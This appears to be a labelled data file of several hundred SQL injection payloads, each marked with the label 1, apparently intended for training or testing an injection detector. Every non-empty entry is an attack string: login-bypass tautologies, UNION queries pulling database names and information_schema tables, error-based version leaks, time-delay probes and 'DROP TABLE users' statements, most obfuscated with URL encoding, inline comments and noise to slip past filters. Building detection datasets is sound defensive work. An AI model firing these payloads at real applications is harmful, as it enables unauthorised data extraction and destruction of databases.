"TESt'or%0d%0a'1'<='1'%0d%0a/*--yr0dwmyrp%0d%0a", 1
"%27UNION%0d%0a%53ELECT/*%0a*/1,%32,3--%0a", 1
";D%52OPTABLE%20users%3b%0d%0a OR (1)--", 1
"'AND1>=1--#jucwfzx79w9j/*%0a*/", 1
"test%27%2F%2A%2112345%2A%2FOR%20%271%27IN%20%281%29%271%27%20--%20", 1
"'/**/AND/**%2fex%74ractvalue(1,co%6ecat(%30%785c,version()))%2d-", 1
";/**/S%45LECT/**/%70g_sleep(5);/**/%2d---m7bjvibktod", 1
"1%u0020AND%u00201=1%u0020OR%u0020(1)--tpnqlt", 1
"%2%37%20UN/*!*/ION%%320S%45LEC%54%201%2C2%2C3--", 1
"1%27%20OR%20IF%28sub%2573t%2572ing%28d%2561tabase%28%29%2C%201%2C%201%29%3D%27a%27%2C%20SL%2545%2545P%285%29%2C%200%2529%20--%23sm8rm", 1
"1)/*!*/UNIONSELECT/*%0d%0a*/1,database(),3--", 1
"", 1
"waitfordELAY%0a'0:0:5'--", 1
"1%27%20UNION%20SELECT%20table_name,%20null,%20null%20FROM%20information_schema.tables%20--#qcoi5", 1
"1%u0027%u0020XOR%u0020substring(database(),%u00201,%u00201)%u0020%3E%3D%u0020%u0027s%u0027%u0020--", 1
"1%u0027%u0020AND%u0020substring(database(),%u00201,%u00201)%u0020%3D%u0020%u0027s%u0027%u0020--", 1
"' AND extractvalue(1,concat(0x5c,version()))----rpudbiumy", 1
"%27%20ANd%20eXtRAcTvalUE%281%2ccoNcAT%280x5C%2cVErsIoN%28%29%29%29%20%2f%2A%21%2A%2faND%201%3d1--", 1
"' AND extractvalue(1,concat(0x5c,version()))----01zolzawp", 1
"%27/**/AND/**/extractvalue(1,concat(0x5c,version()))%20/*!*/AND%201%3D1--#1h1temb6", 1
"test'||'1'IN (1)'1'", 1
"OR (1)--%0a", 1
"'%09%09AND%09%09extractvalue(1,concat(0x5c,version())) -- random_noise----b2jt0y4", 1
"'U%4eIONSELECT/%2a%0d%0a*%2fnull,nul%6c,%0an%75ll--%0d%0a--zhzad2bq1", 1
"test' O%52%20'1'='1' /*", 1
"admin' OR '1'%09=	'1", 1
"admin%27%20XOR%20%271%27%3D%271--xkwvd8k5lzbkga", 1
"%27%20%4fR%20%271%27%3D%271%20AND%20%27a%27%3D%27a%27", 1
"1%20AND%201%3D1#08yer5l7rs", 1
"%U0027%u0020or%u0020%u0027%31%27=%U00271", 1
"1%27%20O%52%20ascii(subs%74ring(datab%61se(),%201,%201))%20%3E%20100%20--", 1
"1'/*!12345*/AND substring(database(), 1, 1) = 's'  /*!*/AND 1=1--", 1
"1)UN%49O%4e", 1
"SELECT/*%0a%2a/1,database(%29,3--", 1
"'					AND					1 =%20convert(int,@@version)--", 1
"%u0027%u0020XOR%u00201=convert(int,@@version)--", 1
"'/**/UNION/**/SELECT/**/1,2,3----x3d322bh42", 1
"'UNiONselEct%0d%0a1,2,3--", 1
"%27%2520Or%201%3D1%20%20%23%20more_no%2569se-%252d%20", 1
"1/*!*/AND 1%3d1", 1
"%27/**/OR/**%2f%271%27%3D%%32%371%20A%4e%44%20%27a%27%3D%27a%27", 1
"'%09%09%09AND%09%09%091%09=%201%09%09%09--%09%09%09", 1
"'%09AND%09extractvalue(1,concat(0x5c,version()))--", 1
"test%25u0027%2F%2A%2A%2FOR%25u0020%25u00271%25u0027%3C%3D%25u00271%25u0027%25u0020%2F%2A", 1
"%27OR", 1
"1%20%20%3D	1--/*%0d%0a*/%0a", 1
"1%27%20UNION%20S%2545LECT%20t%2561bl%2565_name%2C%20nu%256cl%2C%20n%2575ll%20FROM%20%2569nformation_schem%2561.%2574ables%20--", 1
";%20DROP%20TAB%4c%45%20users%3b%20--", 1
"1%27%20O/**/R%20IF(substring(database(),%201,%201)%3D%27a%27,%20SLEEP(5),%200)%20--", 1
"%31%u0027%u0020O/*!*/R%u00%320IF(sub%73tri%6eg(%64at%61base(),%%7500201,%u00201)=%u0%302%37a%u0027,%u0020SLEEP(%35),%u00200%29%u0020--#7gmxb3yg", 1
"1%29%20UNIO%4e%20SELECT%2%301,databas%65(),3 -- ran%64om_no%69se--", 1
"'/**/AND/**/1<=1/**/--/**/--ibp59iy", 1
"1'/**/A/*!*/ND/**/substring(database(),/**/1,/**/1)/**/=/**/'s'/**/--", 1
"%27%20AND%201%3Dconvert(int,@@version)----o3n34dr", 1
"' || (1IN (1)1)1=1 -- --wcz6524hvxdo", 1
"te%73t' %4fR%20'1'='1' --", 1
"1))    UNION    SELECT    1,database(),3--#gsrg9e87rwxc0", 1
"1'UNIONSELECTtable_name,null,%0d%0anullFROM/*%0d%0a*/information_schema.tables--", 1
"admin'/**/OR/**/'1' =%09'1", 1
"1)					UNION					SE%4cECT					1%2cdatabas%65(),3-%2d", 1
"1)) UNION SELECT 1,database(),3----ixfsb0l3ow2", 1
"admin%u0027%%7500%320%4fR%u0020%%7500271%u0027%3d%u00271", 1
"%27%09AND%091%2520%3D%201%09--%09", 1
"1 AND 1=1#64k7o", 1
";DROP", 1
"TABLEusers;--/*%0a*/#tov069xrr98o", 1
"TeST'/*!*/Or '1'='1' /*", 1
"%27%20%4fR%201%%33D1%20--%20", 1
"1%27%20AND%20substring%28database%28%29%2C%201%2C%201%29%20IN%20%281%29%20%27s%27%20--", 1
"1' UNION SELECT table_name, null, null FROM information_schema.tables  -- random_noise--", 1
";%09%09%09%09DROP%09%09%09%09TABLE%09%09%09%09users;%09%09%09%09--", 1
"1AND%2F%2A%250a%2A%2F1%3D1%250a", 1
"' OR 1=1 -- #j7z6zbd4sadk4qy", 1
"admin'%09OR%09'1'%09=  '1", 1
"1)Union/*%0a*/SeleCt%0D%0A1,DatabaSE(),3--", 1
"1%2529%20U%254eION%20SELEC%2554%201%2Cdatabase%2528%29%2C3%20--%20rand%256fm_noise--", 1
"aDmin%27oR%0a%271%27%3D%271/*%0d%0a*/", 1
"' OR 1>=1 -- --f4c0g3x", 1
"1)%u0020UNIO%4e%u0020SEL%45CT%u00201%2cdatabase(),3---%2dx%34ejisyse9hz", 1
"%27%20A/*!12345*/ND%201%3Dconvert(int,@@version)--", 1
"1%27%20&&%20substring(database(),%201,%201)%20%3D%20%27s%27%20%20/*!*/AND%201%3D1--", 1
"1'          &&          SubSTRinG(DAtabAse(),          1,          1)          LIKE          's'          --", 1
"%27AND1%3DCOnVeRT(inT,@@VeRSioN)--%0a", 1
"%27%20UNION%20SELECT%201%2C2%2C3 AND 'a'='a'--", 1
"1%u0027/**/OR/**/IF(substring(database(),/**/1,/**/1)=%u0027a%u0027,/**/SLEEP(5),/**/0)/**/%u0020#%u0020more_noise--", 1
"admin'O/**/R/*%0a*/'1'='1%0a", 1
"' && (1=1)extractvalue(1,concat(0x5c,version()))--#gev0j", 1
"test%27OR%271%27%3D%271%27/*", 1
"", 1
"admin'/*!*/OR'1'/*%0d%0a*/='1%0a#aaz0xl", 1
"test'OR", 1
"'1'='1'%0d%0a/*%0d%0a AND 'a'='a'", 1
"1/**/and/**/1%3D1/**/--/**/random_noise", 1
"admin'/**/OR/**/'1'='1/**/--/**/random_noise", 1
";/**/DROP/**/TABLE/**/users;/**/ AND 'a'='a'--", 1
"1'/*!12345*/OR IF(substring(database(), 1, 1)='a', SLEEP(5), 0) --#8hd9cgag", 1
"WAITFORDELAY/*%0d%0a*/'0:0:5'--%0d%0a", 1
"1A%4eD%0d%0a1=1/*%0a*/", 1
"test'OR'1'='1'/*%0d%0a*/--", 1
"1%27/*!*/%41ND su%62%73tring(databas%65(%29,%201, 1) = 's'  OR 'b'='b'----pfrawlf8xrt", 1
"%u0027%u0020AND%u0020e%78tract%76al%75e(1,%63oncat(0x5c,version%28)))--", 1
"%27%20UN/*!12345*/ION%20SELECT%201%2C2%2C3--%23bfj8nzto0c59z", 1
"%27%20UNION%20SELECT%20null%2C%20null%2C%20null%20%20OR%20%27b%27%3D%27b%27--%20", 1
"1'%09%09%09%09AND%09%09%09%09substring(database(),%09%09%09%091,%09%09%09%091)%09%09%09%09%09=%20%09%09%09%09's'%09%09%09%09--", 1
"1/**/AND/**/1IN/**/(1)1", 1
"1%2527%2520AND%2520substring%28database%28%29%2C%25201%2C%25201%29%2520%253D%2520%2527s%2527%2520%2520OR%2520%2527b%2527%253D%2527b%2527--", 1
"%27%20or%201%3D1%20/**/#/**/MORE_NoISE--%20", 1
"1' OR IF(substring(database(), 1, 1)='a', SLEEP(5), 0) ----3mo2tu15ajkgsa", 1
";/**/sELECt Pg_SLEep(5);  # more_noise--", 1
"'/*!12345*%2fO%52/**/'%31'='1", 1
"%27/**/UNION/**/SELE%43T/**/%6eull,/**/null,/**/null/**/-%2d/**/", 1
"%27%20UNion%20sELEcT%201%2C2%2C3--#m8k08ti0yua", 1
"1%2527A/*!12345*/NDsubstring%28database%28%29%2C1%2C1%29%253D%2527s%2527%250d%250a--", 1
"1'oRIF(sUBsTriNg(databAse(),1,1)%20=%20'a',slEEp(5),0)/*%0d%0a*/--%0d%0a", 1
";%20seLEcT%20pg_sLEEP(5);%20--", 1
"%u0027%u0020OR%u00201%3D1%u0020--%0d%0arandom_noise--%u0020%0a", 1
"'/**/uNion/**/SELeCt/**/NULl,/**/NULL,/**/NuLl/**/--/**/", 1
"admin%27%20%7C%7C%20%281%3D1%29%271%27%3D%271", 1
"1' OR ascii(%73%75bstri%6e%67(dat%61base(), 1, 1)) > 100 -%2d#de9y4z2l", 1
"'XOR1LIKEconvert(int,@@version)--/*%0d%0a*/", 1
"1'ORascii(substri%6eg%28data%62ase(),1,/*%0d%%30%61*/%0a1))>100-%2d--uoe5cn", 1
"WAITFORDELAY%0a'0:0:5'--%0a", 1
"; DROP TABLE users; --#0uxarmof42sk3ua", 1
"%27%20OR%201%3D1%20%20OR%20%281%29--%20%23bcp06r4x1784ms", 1
"'ANDextractvalue(1,concat(0x5c,version()))--", 1
"--otvu1bjnrp3pc", 1
"%27aN%64%0d%0a1=coNvErT(IN%54,@@v%45rSion)--/*%0d%%30a*/", 1
"test' OR '1'='1' /*--awb2qgyyf6w", 1
"%27%2F%2A%2A%2F%4fR%%32%46%2A%2A%2FEXISTS%28SEL%45CT%2F%2A%2A%2F1%2F%2A%2A%2FFR%4fM%2F%2A%2%41%2Fu%73ers%29-%2d", 1
"'    OR    '1' = '1    /*!*/AND    1 = 1--7vruvr39vf8sl8", 1
"1)%u0020UNION%u0020SELECT%u00201,database(),3--#y4fropcplkbu", 1
"1%29)/**/UNION/**/SE%4cECT/**/1,da%74abase(),3-%2d--tfaa%70", 1
"' XOR 1=1  OR 'b'='b'--", 1
"1) UNIOn seleCT 1,DATAbaSe(),3--", 1
"%u0027%u%30020A/*!12345*/ND%%7500201%3e=1%u002%30--%u00%320", 1
"1%29%20UNION%20SELECT%201%2Cdatabase%28%29%2C3%20OR%20%27b%27%3D%27b%27--", 1
"test%u0027%u0020OR%u0020%u00271%u0027IN%20(1)%u00271%u0027%u0020--%u0020", 1
"%u0027||(1=1)%u00271%u0027=%u00271%0d%0a", 1
"1%20AND%%3201%3%441%20/*!*/AND%201%3%441", 1
"1'/*!12345*/UNION SELECT table_name, null, null FROM information_schema.tables  /*!*/AND 1=1--", 1
"' UN%49ON SELE%43T null, null, nul%6c --%20", 1
"1%09%09%09%09anD%09%09%09%091%20=%201%09%09%09%09#%09%09%09%09more_nOise#fzehpwv49pgh", 1
"1' UNIO%4e %53ELEC%54 table_nam%65, null,%20null FROM information_schema.tab%6ce%73 -%2d", 1
"'/**/UNION/**/SELECT/**/1,2,3 -- random_noise--", 1
"%27%20AND%201%3D1%20 AND 'a'='a'--%20#1q7i36voo2dgigw", 1
"WAITFOR%u0020DELAY%u0020%u00270:0:5%u0027----svjjhn28bfe97", 1
"1%27%20O%52%20ascii(subst%72ing(%64ata%62ase(),%201,%201))%20%3E%20100%20%20/*!*/AND%201%3D1--", 1
"%u0027%u0020%55NION%u0020SELECT%u00201,2,3%u0020%4fR%20%u0027b%27=%u0027b%u0027--", 1
"1))UNIONSELECT/*%0a*/1,database(),3--", 1
"", 1
"1%27%20aND%20sUbsTring%28DAtabAse%28%29%2C%201%2C%201%29%20%3D%20%27S%27%20or%0d%0a'B'='B'--", 1
";%20SelecT%20PG_sLEEp(5);%20--", 1
"'AND/*%0a*/1=1", 1
"--%0a", 1
"1%27%20AND%20su%62string(database()%2c%201,%20%31)%20%3D%%320%2%37%73%27%20----mpue7%6ejsm4lcu", 1
"1%27%20unIoN%20selECt%20tABLe_NAME,%20null,%20nUll%20frOm%20inFORMaTIon_scHema.TabLEs%20--", 1
"1' OR IF(s%75bstring(databa%73e()%2c 1, %31)='a'%2c%20SLEEP(5), 0) --", 1
";/**/sELECT/**/PG_Sleep(5);/**/--#4iy7O93XQaC74c", 1
"1) UNION SELECT 1,database(),3----chxsuinbjx74", 1
"'/**/UNIOn/**/sElecT/**/1,2,3--", 1
"W%41ITFOR%20DELAY%20'0:0:5'--", 1
"%27%20AND%20extractvalue%281%2Cconcat%280x5c%2Cversion%28%29%29%29----8k591", 1
"t%65%73t' OR '%31'LIKE'1' /* OR (1)", 1
";DROPTABLE%0d%0ausers;--", 1
"1/*!%3123%345*/AND 1=1", 1
"aDmI%6e' OR '1'='%31", 1
"%27%20AN%44%201%3Dconver%74(int,@@version)-%2d", 1
"' AND 1<=1  # more_noise--", 1
"' OR '%31%27LIKE'1", 1
"%27OR1%3D1%2F%2A%250d%250a%2A%2F%23more_noise--%0A%0A", 1
"1'UNIONSELECTtable_name,null,nullFROM", 1
"information_schema.tables/*%0a*/", 1
"AND'a'='a'--", 1
"'%09%09%09OR%09%09%091%20=	1%09%09%09--%09%09%09", 1
"'%20%20%20%20%20AnD%20%20%20%20%201%09=%091%20%20%20%20%20--%20%20%20%20%20", 1
"%27%20%20%20OR%20%20%20%271%27%20%20%3D%20%20%271#z5s6hjty4wd", 1
"1'ORascii(substring(database(),1,1))/*%0d%0a*/>%0d%0a100%0a--", 1
";/*!12345*/drOp%09%09%09tABlE%09%09%09UseRs;%09%09%09--", 1
"'OREXISTS(SELECT/*%0a*/1FROMusers) -- random_noise--", 1
"1'ORIF(substring(database(),%0a1,1)='a',SLEEP(5),0)--#gs7eg9irjh2aca2", 1
"1' %4fR ascii%28substri%6eg(datab%61se(), 1, 1)) > 10%30 --", 1
"1%u0027%u0020AND%u0020substring(database(),%u00201,%u00201)%u0020IN/**/(1)%u0020%u0027s%u0027%u0020--", 1
"test'OR/*%0a*/'1'='1'/*", 1
"", 1
"%27AND%0a1%3Dconvert(int,@@version)--", 1
"--084kbmep3yoqo", 1
";%09sElECT%09pg_SleEp(5);%09----axH2Y13XoB", 1
"1%U0020ANd%u00201%3D1", 1
";seLECT%0D%0APG_SlEep(5);%0A--%0A", 1
";/**/SElECT/**/p%47_sL%45Ep(5);%2f**/%2d-", 1
"1' OR ascii(substring(database(), 1, 1)) > 100 --#camgfbygxt2", 1
"1'UNIONSELECT%0atable_name,null,%0d%0anullFROMinformation_schema.tables/*%0d%0a*/--", 1
"1'/*!*/ORascii(substring(database(),1,1))>%0d%0a100--", 1
"'/**/UNIONSELECTnull,%0d%0anull,null--%0d%0a", 1
"' %55%4eION SELECT nul%6c, null,%20null --", 1
"%27%20UNION%20SELECT%20null,%20null,%20null%20--%20--tc81lo7hl3", 1
"admin' OR '%31'%3d'1", 1
"; SELECT pg_sleep(5); --#u3j7tm02d", 1
"1%09AND%091/*!*//**/=/**/1", 1
"'			AnD			1	=%201			--", 1
";/**/DROP/**/TABLE/**/users;/**/ -- random_noise--", 1
"1%U0027%u0020aND%u0020SuBStrING(datAbASE(),%u00201,%u00201)%U0020=%U0020%u0027S%U0027%U0020--", 1
"1'/**/AND/**/substring(database(),/**/1,/**/1)/**/=/**/'s'/**//**/--/**/random_noise--", 1
"%27%u0020&&%u0020(1=1)extrac%74valu%65(1,concat(%30x5%63,version()))%u0020/*!*/AND%u0020%31=1%2d-", 1
"; DROP tabLE UseRS;  anD 'A'='A'--", 1
"%27%2%30%41ND%%3201LIKE1%20--%20", 1
";%09SELECT%09pg_sleep(5);%09--", 1
"1)) uNioN SELECt 1,databAsE(),3--#o5njr451hz", 1
"' && 1=%31 %2d%2d #36d0i4cwz098j", 1
";dRoPtaBlE/*%0a*/UseRs;%0d%0a/*%0a*//*!*/AND1=1--", 1
"te%73t%27/**/OR '1'='1' /*", 1
"'UNION/*%0d%0a*/SELECT", 1
"1,2,3--", 1
"", 1
"test%27%2F%2A%2A%2FOR%2F%2A%2A%2F%271%27%3D%271%27%2F%2A%2A%2F OR (1)--%2F%2A%2A%2F", 1
"1))%u0020UNION%u0020SELECT%u00201,database(),3--#ekqupswsy", 1
";%09%09DROP%09%09TABLE%09%09users;%09%09--", 1
"%27%2F%2A%21%2A%2FOR%20EXISTS%28SELECT%201%20FROM%20users%29%20%23%20more_noise--%23gyid92r0", 1
"' AND extractvalue(1,concat(0x5c,version()))----whf0f2oxi", 1
"1' OR %61scii(su%62string(database(), 1, 1)) %3e 1%300  %2d%2d rando%6d_noise--", 1
"W%41ITFOR DELAY '0:0%3a%35'--", 1
"test' OR '1'LIKE%271%27 /*--r8iozp", 1
";%20%20%20DRoP%20%20%20TablE%20%20%20uSeRs;%20%20%20--", 1
"1%27%2520AND%20substring%28databas%2565%28%29%2C%20%2531%2C%20%2531%29%20%3D%2520%27s%27%20--", 1
"'/**/UNION/**/SELECT/**/1,2,3/**//*!*/AND/**/1=1--", 1
"%u0027AND1=1--%0a", 1
"1' OR ascii(substr%69ng%28da%74a%62ase()%2c 1, 1)) > 100 --", 1
"admin'%20OR/**/'1'<='%31", 1
";SELECT/*%0d%0a*/pg_sleep(5);%0aAND%u0027a%u0027=%u0027a%u0027--", 1
"TeSt' oR '1'='1' --", 1
"test%27%2509%2509%2509%2509%2509OR%2509%2509%2509%2509%2509%271%27%20%3D%09%271%27%2509%2509%2509%2509%2509%2F%2A", 1
"1))/**/UNION%u0020SELECT%u00201,database(),3 OR 'b'='b'--", 1
"'%20%20%20UNION%20%20%20SELECT%20%20%201,2,3--", 1
"1'O/*!12345*/RIF(substring(database(),1,1) = 'a',SLEEP(5),/*%0a*/0)--", 1
"test%25u0027%25u0020OR%25u0020%25u00271%25u0027%3D%25u00271%25u0027%25u0020%2F%2A%25u0020OR%25u0020%281%29", 1
"%3B%2F%2A%2A%2FSELECTpg_sleep%285%29%3B--%250a", 1
"test' || (1%3d1)'1'='%31' /*%2333h5%65mg", 1
"1)%u0020UNION%u0020SEL%45CT%201%2cda%74abase(),3--#p5xnd", 1
"WAITFOR DELAY '0:0:5' OR 'b'='b'--", 1
"TeSt' Or '1'='1' --", 1
"%27%20and%201%3dCOnvert%28Int%2c%40%40VERsIon%29--", 1
"%2527%2520AND%25201%253D1%2520 OR (1)--%2520", 1
"test%u0027/**/OR/**/%u00271%u0027>=%u00271%u0027/**//*", 1
"'/*!12345*/And 1=1 --", 1
"'/**/AND/**/extractvalue(1,concat(0x5c,version()))----mqdd3ueekht0a0p", 1
"%u0027%u0020%u0020%u0020%u0020%u0020%u0020%u0020%u0020AND%u0020%u0020%u0020%u0020%u0020%u0020%u0020%u00201%u0020%u0020=%u0020%u00201%u0020%u0020%u0020%u0020%u0020%u0020%u0020%u0020--%u0020%u0020%u0020%u0020%u0020%u0020%u0020%u0020", 1
"%31' %55NiOn SeLeCT%20TaBle_NAME, n%75Ll, NULl F%52%4fm infoRmATION_sc%68emA.tABLes %2D-", 1
"1'/**/AnD/**/suBStRInG(dATaBASE(),/**/1,/**/1)/**/lIkE/**/'S'/**/--#70jco2ol", 1
"%u0027%u0020OR%u0020%u00271%u0027%09=%09%u00271--0kx6rzk6lhl", 1
"1%27%20OR%20IF%28substring%28database%28%29%2C%201%2C%201%29%3D%27a%27%2C%20SLEEP%285%29%2C%200%29%20%20OR%20%27b%27%3D%27b%27--", 1
"admin'/**/O/**/R/**/'1'='1", 1
"' UNI%4fN SELECT nul%6c,%20null, n%75ll --", 1
"1'					UN/*!*/ION					SELE%43T					%74able_%6eame,					null,					null					FR%4fM					informa%74io%6e_schema.%74%61bles					--", 1
"%2527%2520XOR%25201%253Dconvert%28int%2C%40%40version%29%2520--%2520random_noise--", 1
"1%27%20or%20aScII%28SUbSTriNG%28dataBaSE%28%29%2C%201%2C%201%29%29%20%3E%20100%20--", 1
"'AND/*%0a*/1	=%20convert(int,@@version)----0216spa9pufop", 1
"' AND 1=convert(int,@@version)--#ket9v", 1
"%27%20uNioN%20sElecT%201,2,3--", 1
"%27%20UN/*!12345*/ION%20SELECT%20null,%20null,%20null%20 -- random_noise--%20", 1
"; S%45LECT pg_%73%6ceep(5); --", 1
"test'/*!*/OR '1'='1' /*#3pwlb0kc4gni6", 1
"1)%u0020%55NION%u0020SELECT%u00201%2cdatabase%28),3%2d---yglyh6b", 1
"%27%20OR%20%271%27%3D%271#j3epgwsg0zmh", 1
"1))%20uNIon%20sELect%201,DATaBaSE(),3--", 1
"1%27/**/UNION/**/SELECT/**/table_name,/**/null,/**/null/**/FROM/**/information_schema.tables/**/--", 1
"admin%27%20OR%20%271%27%3D%271#ep6ho6yski15z2y", 1
"1%U0027%u0020AnD%u0020sUBSTrInG(datAbASE(),%U00201,%U00201)%U0020=%U0020%u0027s%u0027%U0020--", 1
"' oR 1=1 -- #kjlvdibq", 1
"'O/**/R%0A'1'='1/*%0D%0a*/", 1
"test'%09%09OR%09%09'1'	=  '1'%09%09/*--c7y2p6bqnza6qjb", 1
"1))uNIONSEleCt/*%0A*/1,datAbASe(),3--", 1
"teST%27%20oR%20%271%27%3D%271%27%20 /*!*/AND 1=1--%20", 1
"1/**/AND 1=1", 1
"1'/**/OR%09%0%39a%73cii(%73%75bs%74r%69ng%28database(),%09%091,%09%091))%09%09>%09%09100%09%%309--", 1
"%27OR1%3D1%250a /*!*/AND 1=1--%250a", 1
"%u0027/**/UNION/**/SELECT/**/null,/**/null,/**/null/**/%u0020--%u0020random_noise--/**/", 1
"%u0027%u0020AND%u00201=convert(int,@@version)--#gltxigtc", 1
"1%u0027%u0020OR%u0020ascii(substring(database(),%u00201,%u00201))%u0020>%u0020100%u0020 OR (1)--", 1
"' aNd extracTVALUe(1,CoNCAT(0x5C,verSioN()))--", 1
"1%20AND%201%3E%3D1", 1
"1)%29%2f*!*/UNION%%320SELECT%201,databas%65(),3--", 1
"1%u0027UN/*!*/IONSELECT/*%0d%0a*/table_name,null,nullFROMinformation_schema.tables--/*%0d%0a*/", 1
"1) UNION SELECT 1,database(),3 XOR (1)--", 1
"%u0027%u0020AND%u00201> =%09convert(int,@@version)%u0020/*!*/AND%u00201 =%091--", 1
"%27%2F%2A%2A%2F%26%26%2F%2A%2A%2F1%3D1%2F%2A%2A%2F--%2F%2A%2A%2F", 1
"test%27%2F%2A%21%2A%2FOR%20%271%27IN%20%281%29%271%27%20--%20", 1
"%27%20OR%20EX%49STS%28SELECT%2%301%20FRO%4d%20users)-%2d", 1
"'%20%20%20OR%20%20%201%09=/*!*/1%20%20%20--%20%20%20#nuqnkh", 1
"1)/**/UNIon/**/selEct/**/1,DaTabasE(),3----k2gon52l5ltat0g", 1
"1'/**/uNION/**/SELEct/**/TABle_nAME,/**/NUlL,/**/NULl/**/FRom/**/inFormAtiON_scHeMa.TABLEs/**/ || (1)--", 1
"1 AND%201=1 OR 'b'='b'#43torfz4smq", 1
"'AND%0aextractvalue(1,concat(0x5c,version()))--#c1euufri", 1
"1%u0027/**/%4fR/**/asci%69(substring%28database(),/**/1,/**/1)%29/**/%3E/**/100/**/-%2d", 1
"tEST' Or '1'IN (1)'1' /* AND 'a'='a'#h4xml94svuhf8lk", 1
"%61dmin' OR '%31'	= '1", 1
"1'			UNION			SELECT			table_name,			null,			null			FROM			information_schema.tables			--", 1
"1%29%09%09%09UNION%09%09%09SELECT%09%09%091%2Cdatabase%28%29%2C3 -- random_noise--%23zje41e2", 1
"%31)%20UNION SELECT 1,d%61t%61base(),3----yd9o1po5dbowtg", 1
"' AND 1=convert(int,@@version)--#grgtr1js", 1
"TESt'    OR    '1'	=	'1'    --    #bsUE9tsySW0Qt", 1
"adMin%27%20o%52%20%271%27%3D%271", 1
"%2%37%20OR%20%%3271%27%3D%271", 1
"'/**/oR/**/eXiStS(SElecT/**/1/**/frOm/**/UseRs)--", 1
"1%u0027%u0020AND%u0020substring(database(),%u00201,%u00201)%u0020LIKE%u0020%u0027s%u0027%u0020--#hxgt391re", 1
"1)%20%20%20%20UN/**/ION%20%20%20%20SELECT%20%20%20%201,database(),3--", 1
"test'/**/O/**/R/**/'1'='1'/**//*", 1
"%u0027%u0020UNION%u0020SELECT%u0020null,%u0020null,%u0020null%u0020 AND 'a'='a'--%u0020#9maacc", 1
"1%29%29%20UNION%20SELECT%201%2Cdatabase%28%29%2C3 OR 'b'='b'--", 1
"' AND 1=convert(int,@@version)----i5knhahb92dn19", 1
"1'/*!12345*/AND%20subst%72%69ng(database(), 1, 1)%20= 's' -%2d", 1
";/**/drop/**/tAble/**/usERs;/**/--", 1
"' UNION SELECT 1,2,3----4kyjrupsb9v", 1
"1%U0027%U0020o/**/R%u0020iF(SuBsTRiNg(dATABaSE(),%U00201,%U00201)%20=  %u0027a%u0027,%u0020SlEeP(5),%u00200)%u0020--", 1
"%27UNIONSELECTnull,null,%0anull--", 1
"1%27%20OR%20ascii(substring(database(),%201,%201))%20%3E%20100%20----qw1551wvuu1", 1
"; DR%4fP T%41BLE u%73ers; --", 1
"TeST%27%20oR%20%271%27%253d%25271%27%20%2F%2A", 1
"'/*!*/ANd 1IN (1)CONverT(Int,@@VErsioN)--", 1
"'%20%4F%52%20exisTs(SE%4ceCT%201%20FrOM%20Users)-%2D--hYtj5cV", 1
"'UNioNSeLEcT%0d%0a1,2,3--", 1
"' && (1=1)1=convert(int,@@version)--#l339vetxz", 1
"test'/**/OR/**/'1'='1'/**//**/OR/**/(1)--/**/--y8cj56agk", 1
"1 && %31=1", 1
"a%64min%27%20O%52%20%%3271%27%3D%271", 1
"' anD 1=1 --", 1
"1%%320A%4eD%201%3D1", 1
"TeS%74%%327%20O%52%20%271%27%3D%271%27%20-%2d%20", 1
"1'/*!12345*/AND substring(database(), 1, 1) = 's' --", 1
"%27%2520%2520%2520%2520%2520UNION%2520%2520%2520%2520%2520SELECT%2520%2520%2520%2520%2520null%2C%2520%2520%2520%2520%2520null%2C%2520%2520%2520%2520%2520null%2520%2520%2520%2520%2520--%2520%2520%2520%2520%2520", 1
"tesT' || (1=1)'%31'<='%31'%20--", 1
"%27A/*!12345*/ND", 1
"e%78tractvalue(1,%63oncat%28%30x5c%2cversion()))--/*%0a%2a/", 1
"test'  OR  '1'%0%39=%20'1'%20 -%2d  %2d-yprkmys127kbw", 1
"'					OR					1/**//**/=/**/1					 # more_noise--", 1
"1))UNION/*%0a*/SELECT/*%0a*/1,database(),3%20AND%20%27a%27%3D%27a%27--", 1
"1' UnION selecT tabLE_NamE, nulL, null froM infOrMatIOn_SchemA.TABleS --", 1
"%27%20O%52%201%3D1%20-%2d%20--yy4e%338x", 1
"1%u0027ORascii(su%62str%69ng(databa%73e(%29,1,1))/*%0d%%30a*/>%2f%2a%0d%0a*/100%0a--", 1
"1%29%20%20UNION%20%20SELECT%20%201%2Cdatabase%28%29%2C3--", 1
"1'/**/AND/**/SubsTRInG(dAtAbase(),/**/1,/**/1)/**/  =  /**/'s'/**/----XK69xXk1KKtR", 1
"waI%74FOR%20d%65LA%59%20%270%3A0%3A5%27--", 1
"1'/%2a%2a/%4fR/**/ascii(substri%6eg(database(%29,/**%2f1,/**/1%29)/**/>/**/100%2f**/ AND 'a'='a'----wd%680lrutrpnyrbd", 1
"1))/*!12345*/UNION/**/SELECT/**/1,database(),3--", 1
"WAITFOR/**/DELAY/**/%u00270:0:5%u0027/**/OR/**/%u0027b%u0027%u0020=%20%u0027b%u0027--", 1
"'/*!12345*/OREXISTS(SELECT", 1
"1FROMusers)--", 1
"", 1
"%u0027%u0020OR%u002%30EXISTS(SE%4cECT%u0020%31%u0020FROM%%750%3020us%65rs)--", 1
";DROP%0aTABLEusers;", 1
"--", 1
"", 1
"; SELECT pg_sleep(5);  /*!*/AND 1LIKE1--", 1
"%27%20OR%201%3D1%20%20OR%20%27b%27%3D%27b%27--%20", 1
"%27/**/AND%20extractvalue(1,concat(0x5c,version()))--", 1
"Te%53T'/**/or/**/'1'='1'%20/*", 1
"%27%u0020AND%20extractv%61lue(1,con%63%61t(0x5c,version()))----izo%66t", 1
"1%u0020AnD%u00201=1", 1
"Ad%6dIN%27%20%4f%72%20%271%27%3d%271", 1
"%27%2%30AND%20extrac%74value(1,concat(0x5c,%76ersion%28))%29--", 1
"waitfOrDELaY'0:0:5'--/*%0a*/", 1
"Test%27%20oR%20%271%27%20%3D	%271%27%20/%2a", 1
"tEST'/**/oR/**/'1'='1'/**/--/**/", 1
"%27%20UNION%20SELECT%201%2C2%2C3--#oxb5i", 1
"TeST' oR '1'IN (1)'1' /*--aw43r0otsdo6ja", 1
"1))%2f*!123%345*/UNION SEL%45CT 1,database()%2c3 OR (1)%2d-", 1
"test' OR '1'LIKE'1' /* OR 'b'='b'#2ggpo6por5hr4", 1
"test'/*!12345*/OR '1'IN (1)'1' /* -- random_noise", 1
"%u0027%u0020A/*!12345*/ND%u00201=1%u0020--%u0020", 1
"%3B%2F%2A%2112345%2A%2FDROP%20TABLE%20users%3B%20--", 1
"1%u0027&&", 1
"(1=1)substring(database(),/*%0a*/1,1)=%u0027s%u0027/*!*/AND1=1--/*%0a*/", 1
"1'/**/UnioN/**/seLEct/**/taBLE_nAME,/**/NUlL,/**/NULL/**/fRoM/**/infOrmation_ScHEMA.TAbLeS/**/--#u3w1fa6z9lbtqz", 1
